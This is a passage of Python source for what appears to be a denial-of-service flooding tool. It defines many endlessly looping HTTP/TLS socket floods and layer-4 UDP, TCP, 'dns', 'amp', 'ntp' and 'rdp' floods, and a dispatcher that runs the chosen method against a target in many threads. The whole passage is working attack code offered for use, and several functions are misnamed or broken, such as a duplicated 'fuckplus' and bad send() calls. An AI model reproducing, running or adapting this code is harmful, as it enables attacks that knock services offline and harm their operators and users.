                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload34()
                s.send(payl)
        except:
            pass

def fuck():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload35()
                s.send(payl)
        except:
            pass

def tlsv3():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload36()
                s.send(payl)
        except:
            pass

def tlsv4():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload37()
                s.send(payl)
        except:
            pass

def skyplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload38()
                s.send(payl)
        except:
            pass

def wick():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload39()
                s.send(payl)
        except:
            pass

def john():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload40()
                s.send(payl)
        except:
            pass

def fuckplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload41()
                s.send(payl)
        except:
            pass

def fuckplus():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = generate_payload42()
                s.send(payl)
        except:
            pass

# <-----------------------LAYER4 ----------------------> #

def udp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(rpc):
                payl = byt(1024)
                s.sendto(payl, (target2,port))
        except:
            pass

def tcp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target2, port))
            for _ in range(rpc):
                payl = byt(1024)
                s.send(payl)
        except:
            pass

def syn():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            for _ in range(rpc):
                payl = byt(400)
                s.send(payl)
        except:
            pass

def icmp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(rpc):
                payl = byt(3072)
                s.sendto(payl, (target,port))
        except:
            pass

def gudp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(rpc):
                payl = random._urandom(int(random.randint(512, 1024)))
                s.sendto(payl, (target,port))
        except:
            pass

def udpplus():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(rpc):
                payl = random._urandom(800)
                s.sendto(payl, (target,port))
        except:
            pass

def craft():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(rpc):
                payl = b'\x94\x06\x88\x1c?uP|\xe5%=\x9e\xd6-\x9b\x85J\xcd\xd5\xa6|N\r\x89\xa4\xa9\x0b\t\xcf\x85\xd7u\'\xb8uK\xb8!\xb0H1\xb7\xa0\x17`\xd9\xe9\xb0B\xd7W\x98SQb\xc8\x8a\x14\xed\x15/\xe4\xa7\xb5B\xc5\x9a\x000<\xbb4\xa3\x9a\x91\xfd\xe1\x9c\x8d.!9:u\x15\xa8i\xe5\xa5mE\xa0\xe1!\x1e\x1am\xd5"qU\xbfE\xc7\x08o\\3\xe9\xbc\x9aRl\x14\xe4\xa3[\x0c\xda\x9b\xd2\x86\xb6F\'\x1a\xa1z\xbb]\xd5hB\xf30"\xdc\x92T\x13\xb6\x0f\x042g)\xe0qx\x9d\xa6\xc0\xc6\xb4\xc1D3\xddO\x01\x95Gd\xef_\x03\x9b\xda\x7f\x00J\x08\xb9\x88\x88\x16\r\x02\'\x8f\xc7\xf1l\xc2\x85\x8b\x99w\x91$\xe0\xc0\xa08-\xed\x85\x97\xaaE\xc1\xeaxQ\xc2s\x9e\xc88\xa9\x15\xb9\x0bu2\xf0\x95+H\xbf\xa2\x94g\xc30\x81]\xe2\xbc_A\x02\x10\xdf[\xf9w\xbb\xed\xbd\xdfQ\xaa\x15]\xa6\x93T\xa0\xd2\xfe\x9b\x92\xd2\xb3\xf1\xa0\xe6d\x94\xd0\x9aG\xdd\xea\xa3\xfda\xef\xe0O\xb9<,()\xa2\xfd\xb0\xe3\x1b\xd5\xd0\x90\x87\x0fr\xa3\xdb\xd3|\xa3\x88\x1al\x18\x0e\xc4\xabn\x8a\xda<\xccPF\x0e\x05h!\xcc\x8d\xe4{\xb2\x84\xd8w\x91"|a\x1e-\x82\xadv\x1a\x8d\x14\xb6\xda\x10\x13\xd2\xbdw\xd6W\xfb\x8e^/uL\xfa\x12&j\xca\xca\xa2\xf9\xe5\xea[g\xe41y\x05\xfd\xf9\x9e+\x927\x85\xfaU1\t\xb8\xb5p\xdb\xdb\xe7\xe3Y\xc5@\xa0Y\xd4\x91\x7f:\xed\xdf`\xa1i/\xd6\xe8\xae\x82\xdd\x1c\xa0\x1b\x82l\xe4\xb7#\x82\xf5\xf3\xf4~\x05\x83f\xfa:\xf8>|\xbf\xe5=k\xfb\xd3x\xa9R\xb8\x8c\xfa\xa1\x8b\xc8\x0b\x17\xb8\x96\xe4\xfb\x97\xde\\\xef\xdav\x9e\xeb\xb7\xb8#zO\xb0he\xac\x1a\xde\x8db\xa7\x94\xd1!\xce\xf3F\xf0\'\xd7\xbb(\xb2\xe2\xfdN\x06\x04\x08|II\xc1\xa0\xba]r}\x13A\xedJE\x9a$\xc8\xdeyX\xca\xe0\xcbM\xb5l\x05)\x1eJ\x97\xe0\x16@\xbf\x1cd\xefoqp\xb3W%\xa8\x1c\xbby\xce\x01c\x88Wt\x01e\x13\xdc\xed\x08\xdfh\x87\xd7\xdd4\xec\x8a\xe1\x06\x81F\x12\x9f\xec\xa2\x86m;\x10\xcd\xeao\xed\xcc#\x0b\xbbu\xc7\x88\x83\xf6A\x11\x80\x0e\x89\xdc\x83UJ\xa4\xb6\x1b\x8c\xb1\x92\xc1[r\xdc\xeb\x03_\x97<\xe4/\xe1\xb4*Y0:\xe1\xc5\xa2\xc2\xc6K\xd2\x8d\xb6\xd5\xb9\x0b\xb0\xa2\xea\x1e\x8d\xd4`\x06\x0f\xfc\xc4\x83\xe8D\x10@\x08\x17\x04\x9bT\xd0\xf9\xc7\x83\x0f.\xbe\xf3,\xb2\xf3\x14\xe1QTz\'\x80\xbd\xb1\x04`\xe7\x9cYL\x9d\x127`y[\xa5\xf6\x0ezf\xe5>\x88\xcd\x92\xfc\xa9\xa2\rQ\xf1>\xf4@\xd4\x0f\x83]j\xa1\r\xbc\xdf\x82\xca\xe8\xb0\xe9\xf9\n\x06lbu\xbb\xa64u\x1f\xfcu\xfff\x93\xc7\xee$\x0e\x991@t\x90\x9a\x10\xed\xdf_\x99\'\xd5\xbd\xd0\x9d\xbc\'\x815\xeb\x07\x96\x97\x87\xbcX1k1\xbe\xec\xb5\xcb\x99\x9f\x1d`j\xd7\x9b\x1c;&\x8a\xb6\xdc.\x02\x15\xf4\x89\xa3\x88K\'N\x91.9wa\x0b\xd4c\x8f\xc7ye\xa4\x0er?s\xec\xf97\x85\x99\x91\xdb\xd7\xe65\xcf\xed\x05\xcb-Y\xe3\x04)R\x11\xe7w\x80e\x16\xb8\xbd\x18\x98\x0e$O\xabD\xf4\xf8\xb3LH\'\xe3\x80<\xaduj\xfe\x1cz\xf3\x85\x15\xd8\x90\xb8\x83\x8b%Q0i\xd4\x0ffh\xc4\x92)-\x06F\xbc\xc5:"\x8c\xb9nxt\xbb\xcc,\x12\x18^j\xf15\xbd\xc6\x12{\x90;\xa9\x0b\x8f\xb9\x1cs\xb5\x84\x13\xe0\xcd$f\x82\x95\xa7\x03\xe2\x0c`\xbd-\x9b\xe4/\xdf\x85\x03\xbdT\xae\xc2\x9a D\xa7\n\xe6r\xc2E\xe6?\xa4\xa6\x84N}65\xfb\xc5\xb8\xad\x15[\x96$\x91\xc8\xb2\x81\xa4d\xf996>\xf1C\xd2\xff\xac#:\xdb\xffbh=\x8e\xfb\x97{'
                s.sendto(payl, (target,port))
        except:
            pass

def dns():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(rpc):
                payl = random._urandom(23445)
                s.sendto(payl, (target,port))
        except:
            pass

def amp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(rpc):
                payl = random._urandom(5617)
                s.sendto(payl, (target,port))
        except:
            pass

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(rpc):
                payl = random._urandom(22065)
                s.sendto(payl, (target,port))
        except:
            pass
                
def handshake():
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            s.connect((target,port))
            for _ in range(rpc):
                payl = random._urandom(random.randint(512,1024))
                s.send(payl)
        except:
            pass

def byudp():
     while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            for _ in range(rpc):
                payl = random._urandom(512)
                s.send(payl, (target,port))
        except:
            pass

def rdp():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            for _ in range(rpc):
                payl = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',random._urandom(22065)
                s.send(payl, (target,port))
        except:
            pass
        
# <----------------------------------------> #

try:
    Thread(target=timer).start()
except:
    pass

try:
    if method == 'raw':
        for _ in range(threads):
            t = threading.Thread(target=raw)
            t.start()
    elif method == 'bypass':
        for _ in range(threads):
            t = threading.Thread(target=bypass)
            t.start()
    elif method == 'mix':
        for _ in range(threads):
            t = threading.Thread(target=mix)
            t.start()
    elif method == 'cloud':
        for _ in range(threads):
            t = threading.Thread(target=cloud)
            t.start()
    elif method == 'get':
        for _ in range(threads):
            t = threading.Thread(target=get)
            t.start()
    elif method == 'uam':
        for _ in range(threads):
            t = threading.Thread(target=uam)
            t.start()
    elif method == 'waf':
        for _ in range(threads):
            t = threading.Thread(target=waf)
            t.start()
    elif method == 'ovh':
        for _ in range(threads):
            t = threading.Thread(target=ovh)
            t.start()
    elif method == 'onec':
        for _ in range(threads):
            t = threading.Thread(target=onec)
            t.start()
    elif method == 'sky':
        for _ in range(threads):
            t = threading.Thread(target=sky)
            t.start()
    elif method == 'spoof':
        for _ in range(threads):
            t = threading.Thread(target=spoof)
            t.start()
    elif method == 'post':
        for _ in range(threads):
            t = threading.Thread(target=post)
            t.start()
    elif method == 'raw+':
        for _ in range(threads):
            t = threading.Thread(target=rawplus)
            t.start()
    elif method == 'high':
        for _ in range(threads):
            t = threading.Thread(target=high)
            t.start()
    elif method == 'uam+':
        for _ in range(threads):
            t = threading.Thread(target=uamplus)
            t.start()
    elif method == 'tls':
        for _ in range(threads):
            t = threading.Thread(target=tls)
            t.start()
    elif method == 'http/2':
        for _ in range(threads):
            t = threading.Thread(target=http2)
            t.start()
    elif method == 'gurd':
        for _ in range(threads):
            t = threading.Thread(target=gurd)
            t.start()
    elif method == 'kill':
        for _ in range(threads):
            t = threading.Thread(target=kill)
            t.start()
    elif method == 'tlsv2':
        for _ in range(threads):
            t = threading.Thread(target=tlsv2)
            t.start()
    elif method == 'null':
        for _ in range(threads):
            t = threading.Thread(target=null)
            t.start()
    elif method == 'kill+':
        for _ in range(threads):
            t = threading.Thread(target=killplus)
            t.start()
    elif method == 'https':
        for _ in range(threads):
            t = threading.Thread(target=https)
            t.start()
    elif method == 'ir':
        for _ in range(threads):
            t = threading.Thread(target=ir)
            t.start()
    elif method == 'war':
        for _ in range(threads):
            t = threading.Thread(target=war)
            t.start()
    elif method == 'war+':
        for _ in range(threads):
            t = threading.Thread(target=warplus)
            t.start()
    elif method == 'zeus':
        for _ in range(threads):
            t = threading.Thread(target=zeus)
            t.start()
    elif method == 'by+':
        for _ in range(threads):
            t = threading.Thread(target=bypassplus)
            t.start()
    elif method == 'pro':
        for _ in range(threads):
            t = threading.Thread(target=pro)
            t.start()
    elif method == 'crash':
        for _ in range(threads):
            t = threading.Thread(target=crash)
            t.start()
    elif method == 'https+':
        for _ in range(threads):
            t = threading.Thread(target=httpsplus)
            t.start()
    elif method == 'waf+':
        for _ in range(threads):
            t = threading.Thread(target=wafplus)
            t.start()
    elif method == 'storm':
        for _ in range(threads):
            t = threading.Thread(target=storm)
            t.start()
    elif method == 'storm+':
        for _ in range(threads):
            t = threading.Thread(target=stormplus)
            t.start()
    elif method == 'fuck':
        for _ in range(threads):
            t = threading.Thread(target=fuck)
            t.start()
    elif method == 'tlsv3':
        for _ in range(threads):
            t = threading.Thread(target=tlsv3)
            t.start()
    elif method == 'tlsv4':
        for _ in range(threads):
            t = threading.Thread(target=tlsv4)
            t.start()
    elif method == 'sky+':
        for _ in range(threads):
            t = threading.Thread(target=skyplus)
            t.start()
    elif method == 'wick':
        for _ in range(threads):
            t = threading.Thread(target=wick)
            t.start()
    elif method == 'john':
        for _ in range(threads):
            t = threading.Thread(target=john)
            t.start()
    elif method == 'fuck+':
        for _ in range(threads):
            t = threading.Thread(target=fuckplus)
            t.start()
    elif method == 'udp':
        for _ in range(threads):
            t = threading.Thread(target=udp)
            t.start()
    elif method == 'tcp':
        for _ in range(threads):
            t = threading.Thread(target=tcp)
            t.start()
    elif method == 'syn':
        for _ in range(threads):
            t = threading.Thread(target=syn)
            t.start()
    elif method == 'icmp':
        for _ in range(threads):
            t = threading.Thread(target=icmp)
            t.start()
    elif method == 'gudp':
        for _ in range(threads):
            t = threading.Thread(target=gudp)
            t.start()
    elif method == 'udp+':
        for _ in range(threads):
            t = threading.Thread(target=udpplus)
            t.start()
    elif method == 'craft':
        for _ in range(threads):
            t = threading.Thread(target=craft)
            t.start()
    elif method == 'dns':
        for _ in range(threads):
            t = threading.Thread(target=dns)
            t.start()
    elif method == 'amp':
        for _ in range(threads):
            t = threading.Thread(target=amp)
            t.start()
    elif method == 'ntp':
        for _ in range(threads):
            t = threading.Thread(target=flood)
            t.start()
    elif method == 'hand':
        for _ in range(threads):
            t = threading.Thread(target=handshake)
            t.start()
    elif method == 'byudp':
        for _ in range(threads):
            t = threading.Thread(target=byudp)
            t.start()
    elif method == 'rdp':
        for _ in range(threads):
            t = threading.Thread(target=rdp)
            t.start()
    elif method == 'info':
        print(info)
    elif method == 'stat_req':
        rt = requests.get(url)
        rs = rt.status_code
        respon()
    elif method == 'public':
        public()
    elif method == 'options':
        options()
    elif method == 'clear':
        clear()
    elif method == 'ping':
        ping()
except:
    pass

try:
    hhh = 0
    ip = socket.gethostbyname(target)
except:
    pass
